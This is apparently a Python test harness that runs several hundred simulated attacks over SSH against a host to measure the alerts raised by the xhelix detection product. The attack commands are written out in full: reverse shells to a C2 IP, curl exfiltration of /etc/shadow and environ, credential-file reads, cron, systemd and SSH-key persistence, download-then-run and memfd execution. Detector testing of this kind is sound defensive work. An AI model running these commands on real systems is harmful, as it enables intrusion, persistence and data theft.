#!/usr/bin/env python3
"""
Mega attack-sim battery — parameterised variant generation.

Builds and runs 300+ tests across 5 major attack categories by
combinatorially crossing variant dimensions. Each test:
  - records pre-run alerts.jsonl offset
  - executes the attack against prod (over SSH)
  - waits a detector-appropriate window
  - counts matching alerts by rule_id
  - records to CSV
  - cleans up

Run:
  python3 tests/attack-sim/comprehensive_2026-05-22/mega_battery.py

Output:
  mega-results.csv     — per-test row
  mega-summary.md      — category-level + detector-level rollup
  mega-debug.log       — raw alerts collected per test
"""
import json, subprocess, time, re, os, sys, shlex, csv
from datetime import datetime, timezone
from collections import defaultdict, Counter

HOST = os.environ.get("HOST", "65.108.246.67")
C2_IP = os.environ.get("C2_IP", "135.181.79.27")
ALERTS = "/var/log/xhelix/alerts.jsonl"
DIR = os.path.dirname(os.path.abspath(__file__))
RESULTS_CSV = os.path.join(DIR, os.environ.get("RESULTS_FILE", "mega-results-pass2.csv"))
SUMMARY_MD = os.path.join(DIR, "mega-summary.md")
DEBUG_LOG = os.path.join(DIR, "mega-debug.log")

_SSH_CTRL = f"/tmp/.mega_ssh_ctrl_{os.getpid()}"

def ssh(cmd, timeout=30):
    """Run command on prod via SSH; return (rc, stdout, stderr).

    Uses ControlMaster to keep a single persistent SSH connection
    alive across all calls — saves ~1.5s per test by skipping the
    handshake. Master is auto-cleaned on script exit (or on first
    use after a crash because ControlPath is per-PID).
    """
    p = subprocess.run(
        ["ssh",
         "-o", "ConnectTimeout=10", "-o", "BatchMode=yes",
         "-o", "ControlMaster=auto", "-o", f"ControlPath={_SSH_CTRL}",
         "-o", "ControlPersist=600",
         HOST, cmd],
        capture_output=True, text=True, timeout=timeout)
    return p.returncode, p.stdout, p.stderr

def offset_of_alerts():
    rc, out, _ = ssh(f"stat -c %s {ALERTS} 2>/dev/null || echo 0")
    try: return int(out.strip())
    except: return 0

def new_alerts_since(off):
    """Read alerts.jsonl from byte `off`, return list of (rule_id, comm, image)."""
    rc, out, _ = ssh(f"tail -c +{off+1} {ALERTS} 2>/dev/null", timeout=20)
    res = []
    for line in out.splitlines():
        line = line.strip()
        if not line: continue
        try:
            d = json.loads(line)
            ev = d.get("event", {})
            res.append((d.get("rule_id","(none)"), ev.get("comm",""), ev.get("image","")))
        except: pass
    return res

# ============================================================
# TEST TEMPLATES — parameterised
# ============================================================

# --- Category 1: CREDENTIAL THEFT (60+ tests) ---
# dims: reader_tool × target_path × launch_lineage
CRED_READERS = [
    ("cat", "cat", lambda p: f"cat {p}"),
    ("head", "head", lambda p: f"head -c 200 {p}"),
    ("dd", "dd", lambda p: f"dd if={p} of=/dev/null bs=200 count=1 2>/dev/null"),
    ("awk", "awk", lambda p: f"awk '{{print $0}}' {p}"),
    ("sed", "sed", lambda p: f"sed -n '1,5p' {p}"),
    ("grep", "grep", lambda p: f"grep . {p}"),
    ("tail", "tail", lambda p: f"tail -c 200 {p}"),
    ("wc", "wc", lambda p: f"wc -l {p}"),
    ("od", "od", lambda p: f"od -c {p} | head -5"),
    ("xxd", "xxd", lambda p: f"xxd {p} | head -5"),
    ("python_open", "python3", lambda p: f"python3 -c 'open(\"{p}\").read()'"),
    ("perl_slurp", "perl", lambda p: f"perl -e 'open F, \"<\", \"{p}\"; while (<F>) {{}}'"),
]

CRED_PATHS = [
    "/root/.aws/credentials",
    "/root/.aws/config",
    "/root/.azure/credentials",
    "/root/.config/gcloud/credentials.db",
    "/root/.npmrc",
    "/root/.pypirc",
    "/root/.docker/config.json",
    "/root/.kube/config",
    "/root/.git-credentials",
    "/root/.netrc",
    "/root/.config/gh/hosts.yml",
    "/root/.config/op/config",
    "/etc/psa/.psa.shadow",
    "/root/.my.cnf",
]

CRED_LINEAGES = [
    ("direct",    lambda c: c),
    ("from_tmp",  lambda c: f"cp /bin/bash /tmp/.tt-{int(time.time()*1000)%100000} && /tmp/.tt-{int(time.time()*1000)%100000} -c {shlex.quote(c)}; rm -f /tmp/.tt-*"),
    ("from_shm",  lambda c: f"cp /bin/bash /dev/shm/.dd-{int(time.time()*1000)%100000} && /dev/shm/.dd-{int(time.time()*1000)%100000} -c {shlex.quote(c)}; rm -f /dev/shm/.dd-*"),
    ("via_xargs", lambda c: f"echo x | xargs -I{{}} sh -c {shlex.quote(c)}"),
]

def gen_credential_tests():
    """~80 tests across credential-theft variants."""
    tests = []
    # Seed all credential paths first so reads find content
    seed = []
    for p in CRED_PATHS:
        seed.append(f"mkdir -p {os.path.dirname(p)} && [ -f {p} ] || echo 'aws_access_key_id=AKIAEXAMPLE\\naws_secret_access_key=wJalrXUtSecret' > {p}")
    setup = "; ".join(seed)
    # Combinatorial: each reader × subset of paths × subset of lineages = bounded set
    i = 0
    # All readers × 5 most-watched paths × 2 lineages = 12×5×2 = 120 — trim to 80
    for reader_name, reader_comm, reader_fn in CRED_READERS:
        for path in CRED_PATHS[:5]:  # most-protected paths
            for lin_name, lin_fn in CRED_LINEAGES[:2]:  # direct + from_tmp
                if i >= 80: break
                inner = reader_fn(path)
                cmd = lin_fn(inner)
                tests.append({
                    "category": "CRED",
                    "id": f"CRED-{i:03d}",
                    "desc": f"{reader_name} reads {path} ({lin_name})",
                    "cmd": cmd,
                    "expect_rule": r"credbroker\.plaintext_read",
                    "detector": "credbroker.plaintext",
                    "window": 8,  # tightened
                })
                i += 1
            if i >= 80: break
        if i >= 80: break
    # PROCFS variants — use PIDs guaranteed to exist on Plesk hosts.
    # /proc/1/mem requires CAP_SYS_PTRACE to OPEN successfully on
    # some kernels, so we cover that with a try and the procscrape
    # hook still fires on the syscall attempt regardless.
    procfs_targets = ["environ", "maps", "mem", "auxv"]
    # PID candidates: systemd (1), sshd, the xhelix daemon itself
    # (which can also be inspected); these all exist on prod.
    pid_candidates = ["1", "$(pgrep -of sshd | head -1)", "$(pgrep -of php-fpm | head -1)", "$(pgrep -of nginx | head -1)"]
    for target in procfs_targets:
        for pid_expr in pid_candidates:
            i += 1
            # Wrap with guard so an empty pid_expr doesn't make us
            # head /proc//environ (which is a valid path but reads
            # an empty dir — won't fire procscrape).
            cmd = f"P={pid_expr}; if [ -n \"$P\" ] && [ -e /proc/$P/{target} ]; then head -c 100 /proc/$P/{target} > /dev/null 2>&1; fi; true"
            tests.append({
                "category": "CRED",
                "id": f"CRED-{i:03d}",
                "desc": f"procfs read /proc/{pid_expr}/{target}",
                "cmd": cmd,
                "expect_rule": r"cred_proc_scrape",
                "detector": "procscrape",
                "window": 8,
            })
    # Mass scrape patterns
    for n_pids in [10, 50, 100]:
        i += 1
        cmd = f"for p in $(ls /proc/ | grep -E '^[0-9]+$' | head -{n_pids}); do head -c 50 /proc/$p/environ >/dev/null 2>&1; done"
        tests.append({
            "category": "CRED",
            "id": f"CRED-{i:03d}",
            "desc": f"mass scrape {n_pids} pids' /proc/*/environ",
            "cmd": cmd,
            "expect_rule": r"cred_proc_scrape",
            "detector": "procscrape",
            "window": 15,
        })
    return tests

# --- Category 2: PERSISTENCE (60+ tests) ---
PERSISTENCE_TARGETS = [
    # path-template, expected_rule_re, payload
    # Paths verified against pkg/config/presets.go defaultServerWatchPaths
    # AND against rule predicates in ruleset/core/file.yaml.
    #
    # Targets that DON'T have a matching rule yet are noted as
    # KNOWN-GAP; we keep them so test results document the gap.
    ("/etc/cron.d/test-{i}",                    r"cron_new_unit",            "* * * * * root /tmp/p\n"),
    ("/etc/cron.hourly/test-{i}",               r"cron_new_unit|fim\.drift", "#!/bin/sh\nexit 0\n"),
    ("/etc/cron.daily/test-{i}",                r"cron_new_unit|fim\.drift", "#!/bin/sh\nexit 0\n"),
    ("/etc/cron.weekly/test-{i}",               r"cron_new_unit|fim\.drift", "#!/bin/sh\nexit 0\n"),
    ("/etc/cron.monthly/test-{i}",              r"cron_new_unit|fim\.drift", "#!/bin/sh\nexit 0\n"),
    ("/var/spool/cron/crontabs/testu{i}",       r"cron_new_unit|user_crontab", "* * * * * /tmp/p\n"),
    ("/etc/systemd/system/xtest{i}.service",    r"systemd_unit_new",         "[Service]\nExecStart=/tmp/p\n"),
    ("/etc/systemd/system/xtest{i}.timer",      r"systemd_unit_new",         "[Timer]\nOnBootSec=1m\n"),
    ("/etc/profile.d/test{i}.sh",               r"profile_d_dropped|fim\.drift", "echo x\n"),
    ("/etc/init.d/test{i}",                     r"fim\.drift|rc_local_modified", "#!/bin/sh\n"),
    ("/etc/ld.so.conf.d/test{i}.conf",          r"ld_so_conf_modified|fim\.drift", "/tmp\n"),
    ("/usr/lib/security/test{i}.so",            r"pam_module_drop|fim\.drift", "(fake module)\n"),
    ("/etc/xdg/autostart/test{i}.desktop",      r"xdg_autostart_dropped|fim\.drift", "[Desktop Entry]\nName=t\n"),
    ("/etc/pam.d/test{i}",                      r"pam|fim\.drift|tamper",    "auth required pam_unix.so\n"),
]

def gen_persistence_tests():
    tests = []
    i = 0
    # Core paths × multiple variants each
    for path_template, rule_re, payload in PERSISTENCE_TARGETS:
        for variant in range(5):  # 5 variants per template
            path = path_template.format(i=i)
            # All write variants must actually create the file —
            # the shell quoting on variant 4 was broken in v2.
            #
            # Use base64-encoded payload + heredoc style to bypass
            # every quoting trap. All 5 variants use methods proven
            # to actually write a file.
            import base64
            p64 = base64.b64encode(payload.encode()).decode()
            if variant == 0:
                cmd = f"mkdir -p $(dirname {path}) 2>/dev/null; echo {shlex.quote(payload)} > {path}; sleep 2; rm -f {path}"
            elif variant == 1:
                cmd = f"mkdir -p $(dirname {path}) 2>/dev/null; printf '%s' {shlex.quote(payload)} > {path}; sleep 2; rm -f {path}"
            elif variant == 2:
                cmd = f"mkdir -p $(dirname {path}) 2>/dev/null; echo {p64} | base64 -d > {path}; sleep 2; rm -f {path}"
            elif variant == 3:
                # via temp + mv (atomic)
                cmd = f"mkdir -p $(dirname {path}) 2>/dev/null; echo {shlex.quote(payload)} > {path}.tmp && mv {path}.tmp {path}; sleep 2; rm -f {path}"
            else:
                # via dd from stdin — no python quoting needed
                cmd = f"mkdir -p $(dirname {path}) 2>/dev/null; echo {p64} | base64 -d | dd of={path} bs=4096 2>/dev/null; sleep 2; rm -f {path}"
            i += 1
            tests.append({
                "category": "PERSISTENCE",
                "id": f"PERS-{i:03d}",
                "desc": f"write {path} (variant {variant})",
                "cmd": cmd,
                "expect_rule": rule_re,
                "detector": "fim",
                "window": 10,  # FIM scan tick
            })
    # SSH key persistence
    for variant, key in enumerate([
        "ssh-rsa AAAATEST-A test@xhelix",
        "ssh-ed25519 AAAATEST-B test@xhelix",
        "command=\"sh\" ssh-rsa AAAATEST-C ctx-restricted",
        "from=\"10.0.0.1\" ssh-rsa AAAATEST-D ctx-from",
        "ssh-dss AAAATEST-E test@xhelix",
    ]):
        i += 1
        cmd = f"mkdir -p /root/.ssh; touch /root/.ssh/authorized_keys; cp -f /root/.ssh/authorized_keys /tmp/.akb || true; echo {shlex.quote(key)} >> /root/.ssh/authorized_keys; sleep 2; cp -f /tmp/.akb /root/.ssh/authorized_keys 2>/dev/null; rm -f /tmp/.akb"
        tests.append({
            "category": "PERSISTENCE",
            "id": f"PERS-{i:03d}",
            "desc": f"authorized_keys append (variant {variant})",
            "cmd": cmd,
            "expect_rule": r"ssh_key_added",
            "detector": "fim",
            "window": 10,
        })
    return tests

# --- Category 3: MEMORY EXPLOITS (60+ tests) ---
def gen_memory_tests():
    tests = []
    i = 0
    # RWX mprotect — only patterns that ACTUALLY call mprotect with
    # RWX flags (xhelix's eBPF tracepoint is on sys_enter_mprotect;
    # direct mmap(PROT_EXEC) doesn't fire it — that's a known gap).
    # Perl Inline C removed because Inline.pm not installed on prod.
    rwx_attacks = [
        ("python_two_step",        "python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); libc.mmap.restype=ctypes.c_void_p; libc.mmap.argtypes=[ctypes.c_void_p,ctypes.c_size_t,ctypes.c_int,ctypes.c_int,ctypes.c_int,ctypes.c_long]; addr=libc.mmap(None,4096,3,0x22,-1,0); libc.mprotect(ctypes.c_void_p(addr), 4096, 7); print(\"ok\")'"),
        ("python_chunked",         "python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); libc.mmap.restype=ctypes.c_void_p; libc.mmap.argtypes=[ctypes.c_void_p,ctypes.c_size_t,ctypes.c_int,ctypes.c_int,ctypes.c_int,ctypes.c_long]; addr=libc.mmap(None,8192,3,0x22,-1,0); libc.mprotect(ctypes.c_void_p(addr), 8192, 7); print(\"ok\")'"),
        ("c_mprotect",             "echo \"#include <sys/mman.h>\nint main(){void*p=mmap(0,4096,PROT_READ|PROT_WRITE,MAP_ANON|MAP_PRIVATE,-1,0); mprotect(p,4096,PROT_READ|PROT_WRITE|PROT_EXEC); return 0;}\" > /tmp/.rwx.c && gcc -o /tmp/.rwx /tmp/.rwx.c 2>/dev/null && /tmp/.rwx; rm -f /tmp/.rwx /tmp/.rwx.c"),
    ]
    for variant in range(20):  # 20 variants of the basic RWX
        i += 1
        name, base = rwx_attacks[variant % len(rwx_attacks)]
        tests.append({
            "category": "MEMORY",
            "id": f"MEM-{i:03d}",
            "desc": f"RWX mprotect {name} v{variant}",
            "cmd": base,
            "expect_rule": r"mem_mprotect_rwx",
            "detector": "ebpf.memory",
            "window": 10,
        })

    # memfd execve variants
    memfd_attacks = [
        ("memfd_python_truebin",   "python3 -c 'import os, ctypes; libc=ctypes.CDLL(\"libc.so.6\"); fd=libc.memfd_create(b\"x\", 0); os.write(fd, open(\"/bin/true\",\"rb\").read()); os.execve(\"/proc/self/fd/\"+str(fd), [\"x\"], {})' 2>/dev/null; true"),
        ("memfd_python_lsbin",     "python3 -c 'import os, ctypes; libc=ctypes.CDLL(\"libc.so.6\"); fd=libc.memfd_create(b\"y\", 0); os.write(fd, open(\"/bin/ls\",\"rb\").read()); os.execve(\"/proc/self/fd/\"+str(fd), [\"y\"], {})' 2>/dev/null; true"),
        ("memfd_python_idbin",     "python3 -c 'import os, ctypes; libc=ctypes.CDLL(\"libc.so.6\"); fd=libc.memfd_create(b\"z\", 0); os.write(fd, open(\"/usr/bin/id\",\"rb\").read()); os.execve(\"/proc/self/fd/\"+str(fd), [\"z\"], {})' 2>/dev/null; true"),
    ]
    for variant in range(15):
        i += 1
        name, base = memfd_attacks[variant % len(memfd_attacks)]
        tests.append({
            "category": "MEMORY",
            "id": f"MEM-{i:03d}",
            "desc": f"memfd execve {name} v{variant}",
            "cmd": base,
            "expect_rule": r"memfd_run_pattern|from_memfd",
            "detector": "ebpf.spawn",
            "window": 10,
        })

    # ptrace variants. DO NOT ptrace the parent or any SSH-session
    # process — that hangs the SSH command line. Always ptrace a
    # spawned-and-owned subprocess.
    ptrace_attacks = [
        ("gdb_attach_detach", "sleep 30 & SPID=$!; sleep 1; gdb -p $SPID -batch -ex 'detach' -ex 'quit' 2>/dev/null; kill $SPID 2>/dev/null; true"),
        ("strace_attach",     "sleep 30 & SPID=$!; sleep 1; timeout 1 strace -p $SPID 2>/dev/null; kill $SPID 2>/dev/null; true"),
        ("python_ptrace",     "(sleep 30 &); SPID=$!; sleep 0.5; python3 -c \"import ctypes; libc=ctypes.CDLL('libc.so.6'); libc.ptrace(16, $SPID, 0, 0); libc.ptrace(17, $SPID, 0, 0)\" 2>/dev/null; kill $SPID 2>/dev/null; true"),
    ]
    for variant in range(10):
        i += 1
        name, base = ptrace_attacks[variant % len(ptrace_attacks)]
        tests.append({
            "category": "MEMORY",
            "id": f"MEM-{i:03d}",
            "desc": f"ptrace {name} v{variant}",
            "cmd": base,
            "expect_rule": r"any_ptrace|ptrace",
            "detector": "ebpf.proc",
            "window": 10,
        })

    # kernel module load attempts
    for variant in range(10):
        i += 1
        cmd = f"python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); buf=b\"\\\\x00\"*{64 + variant*16}; libc.syscall(175, buf, len(buf), b\"\")' 2>/dev/null; true"
        tests.append({
            "category": "MEMORY",
            "id": f"MEM-{i:03d}",
            "desc": f"init_module syscall (variant {variant})",
            "cmd": cmd,
            "expect_rule": r"kernel_module_load",
            "detector": "ebpf.module",
            "window": 10,
        })

    # bpf() syscall variants
    bpf_cmds = [
        "bpftool prog show >/dev/null 2>&1; true",
        "bpftool map show >/dev/null 2>&1; true",
        "bpftool link show >/dev/null 2>&1; true",
        "python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); libc.syscall(321, 1, 0, 0)' 2>/dev/null; true",
        "python3 -c 'import ctypes; libc=ctypes.CDLL(\"libc.so.6\"); libc.syscall(321, 5, 0, 0)' 2>/dev/null; true",
    ]
    for variant in range(10):
        i += 1
        cmd = bpf_cmds[variant % len(bpf_cmds)]
        tests.append({
            "category": "MEMORY",
            "id": f"MEM-{i:03d}",
            "desc": f"bpf() syscall (variant {variant})",
            "cmd": cmd,
            "expect_rule": r"bpf_syscall_unexpected",
            "detector": "ebpf.self",
            "window": 10,
        })
    return tests

# --- Category 4: C2 / NETWORK (60+ tests) ---
def gen_c2_tests():
    tests = []
    i = 0
    # Reverse shell variants — ALL target port 14400 (where we have
    # a known TCP listener on the dev box). Variants exercise
    # different bash redirection patterns + interpreters, not different
    # ports (we want the eBPF spawn detector to see the socket-FD
    # pattern, not a list-of-ports network signature).
    REVSHELL_PORT = 14400
    bash_variants = [
        f"timeout 4 bash -c 'bash -i >& /dev/tcp/{C2_IP}/{REVSHELL_PORT} 0>&1' 2>/dev/null; true",
        f"timeout 4 bash -c 'exec 3<>/dev/tcp/{C2_IP}/{REVSHELL_PORT}; bash -i <&3 >&3 2>&3' 2>/dev/null; true",
        f"timeout 4 bash -c '(bash -i 0<&0 1>/dev/tcp/{C2_IP}/{REVSHELL_PORT} 2>&1)' 2>/dev/null; true",
        f"timeout 4 sh -c 'sh -i >& /dev/tcp/{C2_IP}/{REVSHELL_PORT} 0>&1' 2>/dev/null; true",
    ]
    for variant in range(12):
        i += 1
        cmd = bash_variants[variant % len(bash_variants)]
        tests.append({
            "category": "C2",
            "id": f"C2-{i:03d}",
            "desc": f"bash/sh /dev/tcp reverse shell v{variant}",
            "cmd": cmd,
            "expect_rule": r"shell_with_socket_fd",
            "detector": "ebpf.spawn",
            "window": 8,
        })

    # Python socket revshells — also single port (14400). Establish
    # the socket BEFORE dup2 + exec so the eBPF spawn handler sees a
    # bash process with stdin already pointing to the socket.
    for variant in range(8):
        i += 1
        cmd = f"timeout 4 python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"{C2_IP}\",{REVSHELL_PORT})); [os.dup2(s.fileno(),x) for x in (0,1,2)]; subprocess.call([\"/bin/bash\",\"-i\"])' 2>/dev/null; true"
        tests.append({
            "category": "C2",
            "id": f"C2-{i:03d}",
            "desc": f"python socket revshell v{variant}",
            "cmd": cmd,
            "expect_rule": r"shell_with_socket_fd|suspicious_interpreter_network",
            "detector": "ebpf.spawn",
            "window": 8,
        })

    # Bare-IP TLS (no SNI) — to a port that has bytes flowing.
    # snicheck requires BytesOut > 0 in connstate; that needs a
    # real TLS handshake (even a half-handshake against an HTTP
    # server is enough — openssl sends ClientHello bytes before
    # giving up). The dev-box listener responds with garbage,
    # which makes openssl send some bytes.
    for variant in range(10):
        i += 1
        port = 14430 + variant  # we have listeners on 14430-14439
        # Use s_client which sends ClientHello bytes regardless of
        # whether peer is real TLS.
        cmd = f"(echo | timeout 4 openssl s_client -connect {C2_IP}:{port} -noservername 2>/dev/null) >/dev/null; true"
        tests.append({
            "category": "C2",
            "id": f"C2-{i:03d}",
            "desc": f"bare-IP TLS no SNI v{variant} port {port}",
            "cmd": cmd,
            "expect_rule": r"tls_no_sni",
            "detector": "snicheck",
            "window": 12,
        })

    # DGA / DNS exfil patterns
    for variant in range(10):
        n_q = 30 + variant * 10
        i += 1
        cmd = f"for q in $(seq 1 {n_q}); do dig $RANDOM$RANDOM.x.{variant}.example +short +timeout=1 +tries=1 >/dev/null 2>&1; done; true"
        tests.append({
            "category": "C2",
            "id": f"C2-{i:03d}",
            "desc": f"DNS exfil burst {n_q} queries",
            "cmd": cmd,
            "expect_rule": r"dns_exfil|dga",
            "detector": "dnsexfil",
            "window": 20,
        })

    # Beacon patterns — keep total attack time bounded so SSH
    # timeouts don't blow up. The beacon detector scores by
    # period+jitter regularity; 6-10 callbacks at 3-4s spacing is
    # plenty for the detector to score AND fits in a ~40s window.
    for variant in range(8):
        n_callbacks = 6 + (variant % 5)   # 6, 7, 8, 9, 10
        period = 3 + (variant % 3)         # 3, 4, 5s
        i += 1
        port = 14450 + (variant % 8)
        cmd = f"for n in $(seq 1 {n_callbacks}); do timeout 1 curl -s http://{C2_IP}:{port}/b$n >/dev/null 2>&1; sleep {period}; done; true"
        # window = attack duration + 8s settling — capped so SSH
        # doesn't time out
        win = min(n_callbacks * period + 8, 45)
        tests.append({
            "category": "C2",
            "id": f"C2-{i:03d}",
            "desc": f"beacon {n_callbacks}cb @{period}s p{port}",
            "cmd": cmd,
            "expect_rule": r"beacon",
            "detector": "beacon",
            "window": win,
        })

    # Raw socket variants (BPFdoor-class)
    raw_socks = [
        "python3 -c 'import socket; s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)); s.close()' 2>/dev/null",
        "python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_RAW, 1); s.close()' 2>/dev/null",
        "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_RAW, 41); s.close()' 2>/dev/null",
    ]
    for variant in range(15):
        i += 1
        cmd = raw_socks[variant % len(raw_socks)] + "; true"
        tests.append({
            "category": "C2",
            "id": f"C2-{i:03d}",
            "desc": f"raw socket variant {variant}",
            "cmd": cmd,
            "expect_rule": r"raw_socket|unexpected_listener",  # known NO-RULE
            "detector": "ebpf.net",
            "window": 8,
        })

    return tests

# --- Category 5: DATA LEAK (60+ tests) ---
def gen_dataleak_tests():
    tests = []
    i = 0
    # Bulk file → curl POST
    for variant in range(15):
        i += 1
        size_kb = 1 + variant*2
        port = 14470 + variant
        cmd = f"dd if=/dev/urandom bs=1024 count={size_kb} 2>/dev/null | timeout 4 curl -s -X POST --data-binary @- http://{C2_IP}:{port}/exfil-{variant} >/dev/null 2>&1; true"
        tests.append({
            "category": "DATALEAK",
            "id": f"LEAK-{i:03d}",
            "desc": f"curl POST {size_kb}KB exfil",
            "cmd": cmd,
            "expect_rule": r".",  # any outbound rule
            "detector": "ebpf.net",
            "window": 10,
        })

    # tar + curl multistage
    for variant in range(10):
        i += 1
        cmd = f"tar czf - /etc/ssh/*.pub 2>/dev/null | timeout 4 curl -s -X POST --data-binary @- http://{C2_IP}:{14490+variant}/tar-{variant} >/dev/null 2>&1; true"
        tests.append({
            "category": "DATALEAK",
            "id": f"LEAK-{i:03d}",
            "desc": f"tar+curl multi-stage exfil v{variant}",
            "cmd": cmd,
            "expect_rule": r".",
            "detector": "ebpf.net",
            "window": 10,
        })

    # /etc/passwd / shadow leak attempts
    sensitive = ["/etc/passwd", "/etc/shadow", "/etc/group", "/etc/sudoers"]
    for variant in range(20):
        i += 1
        target = sensitive[variant % len(sensitive)]
        port = 14500 + variant
        cmd = f"timeout 4 curl -s -X POST --data-binary @{target} http://{C2_IP}:{port}/sys-{variant} >/dev/null 2>&1; true"
        tests.append({
            "category": "DATALEAK",
            "id": f"LEAK-{i:03d}",
            "desc": f"exfil {target} via curl POST",
            "cmd": cmd,
            "expect_rule": r"tamper|read|leak",
            "detector": "fim+egress",
            "window": 10,
        })

    # Database dump exfil simulation
    for variant in range(10):
        i += 1
        cmd = f"echo 'SELECT * FROM users;' | timeout 4 curl -s -X POST --data-binary @- http://{C2_IP}:{14520+variant}/db-{variant} >/dev/null 2>&1; true"
        tests.append({
            "category": "DATALEAK",
            "id": f"LEAK-{i:03d}",
            "desc": f"db-style dump exfil v{variant}",
            "cmd": cmd,
            "expect_rule": r".",
            "detector": "ebpf.net",
            "window": 8,
        })

    # /proc/self/environ leak via curl
    for variant in range(10):
        i += 1
        cmd = f"timeout 4 curl -s -X POST --data-binary @/proc/self/environ http://{C2_IP}:{14530+variant}/env-{variant} >/dev/null 2>&1; true"
        tests.append({
            "category": "DATALEAK",
            "id": f"LEAK-{i:03d}",
            "desc": f"environ self-leak v{variant}",
            "cmd": cmd,
            "expect_rule": r"env_secret_read|cred_proc_scrape",
            "detector": "procscrape+egress",
            "window": 10,
        })

    return tests

# --- Category 6: PROCESS / EXPLOIT (60+ tests) ---
def gen_exploit_tests():
    tests = []
    i = 0
    # /tmp /var/tmp /dev/shm binary execution variants
    for variant, base in enumerate([
        ("tmp_true",    "/tmp/.tt-{i}", "/bin/true"),
        ("tmp_id",      "/tmp/.tt-{i}", "/usr/bin/id"),
        ("tmp_ls",      "/tmp/.tt-{i}", "/bin/ls"),
        ("vartmp_true", "/var/tmp/.tt-{i}", "/bin/true"),
        ("shm_true",    "/dev/shm/.tt-{i}", "/bin/true"),
    ]):
        for n in range(8):
            i += 1
            name, path_tmpl, src = base
            path = path_tmpl.format(i=i)
            cmd = f"cp {src} {path} && {path} 2>/dev/null; rm -f {path}; true"
            tests.append({
                "category": "EXPLOIT",
                "id": f"EXP-{i:03d}",
                "desc": f"{name} v{n}",
                "cmd": cmd,
                "expect_rule": r"binary_runs_from_tmp",
                "detector": "rules.proc",
                "window": 8,
            })

    # Web-server-spawns-shell shapes (fake comm)
    web_comms = ["nginx", "apache2", "httpd", "php-fpm", "caddy"]
    for variant in range(15):
        i += 1
        fake_comm = web_comms[variant % len(web_comms)]
        # Use exec to rename comm
        cmd = f"cp /bin/bash /tmp/{fake_comm} && /tmp/{fake_comm} -c 'sh -c id' 2>/dev/null; rm -f /tmp/{fake_comm}; true"
        tests.append({
            "category": "EXPLOIT",
            "id": f"EXP-{i:03d}",
            "desc": f"fake-{fake_comm} spawn shell",
            "cmd": cmd,
            "expect_rule": r"web_server_spawns_shell|binary_runs_from_tmp",
            "detector": "rules.proc",
            "window": 8,
        })

    # download_then_run pattern
    for variant in range(10):
        i += 1
        port = 14550 + variant
        # First start a fake http server on dev box (we can't here; use a local echo)
        cmd = f"timeout 3 curl -s http://{C2_IP}:{port}/payload 2>/dev/null > /tmp/dl-{variant} && chmod +x /tmp/dl-{variant} && /tmp/dl-{variant} 2>/dev/null; rm -f /tmp/dl-{variant}; true"
        tests.append({
            "category": "EXPLOIT",
            "id": f"EXP-{i:03d}",
            "desc": f"download_then_run v{variant}",
            "cmd": cmd,
            "expect_rule": r"download_then_run|binary_runs_from_tmp",
            "detector": "rules.proc",
            "window": 8,
        })

    # SUID binary creation
    for variant in range(10):
        i += 1
        path = f"/tmp/suid-{variant}"
        cmd = f"cp /bin/sh {path} && chmod 4755 {path}; sleep 1; rm -f {path}; true"
        tests.append({
            "category": "EXPLOIT",
            "id": f"EXP-{i:03d}",
            "desc": f"SUID binary v{variant}",
            "cmd": cmd,
            "expect_rule": r"suid_binary",
            "detector": "fim+integrity",
            "window": 8,
        })

    # Honey file touch variants
    HONEY_PATH = "/etc/xhelix/sealed/test.honey"
    honey_readers = [
        ("cat", f"cat {HONEY_PATH}"),
        ("head", f"head {HONEY_PATH}"),
        ("python_open", f"python3 -c 'open(\"{HONEY_PATH}\").read()'"),
        ("dd", f"dd if={HONEY_PATH} of=/dev/null 2>/dev/null"),
        ("od", f"od -c {HONEY_PATH} | head -3"),
    ]
    for variant in range(10):
        i += 1
        name, base = honey_readers[variant % len(honey_readers)]
        tests.append({
            "category": "EXPLOIT",
            "id": f"EXP-{i:03d}",
            "desc": f"honey {name} v{variant}",
            "cmd": f"{base} >/dev/null 2>&1; true",
            "expect_rule": r"honey",
            "detector": "credbroker.honey",
            "window": 8,
        })

    return tests

# --- Category 7: FALSE-POSITIVE CONTROL (must NOT alert) ---
def gen_fp_tests():
    """Clean tests — must not trigger attack-class alerts.
    Used to measure detector specificity."""
    tests = []
    i = 0
    for n in range(15):
        i += 1
        cmd = f"cat /etc/hostname > /dev/null"
        tests.append({
            "category": "FP",
            "id": f"FP-{i:03d}",
            "desc": "cat /etc/hostname (benign)",
            "cmd": cmd,
            "expect_rule": r"X-MUST-NOT-MATCH-X",
            "detector": "must_be_silent",
            "window": 5,
        })
    for n in range(10):
        i += 1
        cmd = "ls -la / > /dev/null"
        tests.append({
            "category": "FP",
            "id": f"FP-{i:03d}",
            "desc": "ls -la / (benign)",
            "cmd": cmd,
            "expect_rule": r"X-MUST-NOT-MATCH-X",
            "detector": "must_be_silent",
            "window": 5,
        })
    return tests

# ============================================================
# RUNNER
# ============================================================

_seen_setups = set()  # memoize; same setup string runs once per battery

def run_test(test, debug_fh):
    off = offset_of_alerts()
    started_at = datetime.now(timezone.utc).isoformat()
    t0 = time.time()

    # Setup if any — but only once per unique setup string per battery run.
    setup_cmd = test.get("setup")
    if setup_cmd and setup_cmd not in _seen_setups:
        ssh(setup_cmd, timeout=30)
        _seen_setups.add(setup_cmd)

    # Attack + offset capture + tail in a SINGLE SSH call to minimise
    # roundtrips. We also collect the post-attack tail in the same call.
    win = test.get("window", 10)
    combined = (
        f"OFF=$(stat -c %s {ALERTS} 2>/dev/null || echo 0); "
        f"{test['cmd']} > /dev/null 2>&1; "
        f"sleep {min(win, 90)}; "
        f"tail -c +$((OFF+1)) {ALERTS} 2>/dev/null"
    )
    try:
        rc, out, err = ssh(combined, timeout=win + 30)
    except subprocess.TimeoutExpired as e:
        # SSH or remote command hung. Mark test as FAIL and continue.
        debug_fh.write(f"[{test['id']}] SSH timeout after {win+30}s: {e}\n")
        debug_fh.flush()
        out = ""
        # Kill any lingering ssh ControlMaster socket
        try:
            subprocess.run(
                ["ssh", "-O", "exit", "-o", f"ControlPath={_SSH_CTRL}", HOST],
                capture_output=True, timeout=5)
        except Exception: pass
        # Make sure the killed-attack process on prod doesn't leave debris
        try:
            subprocess.run(
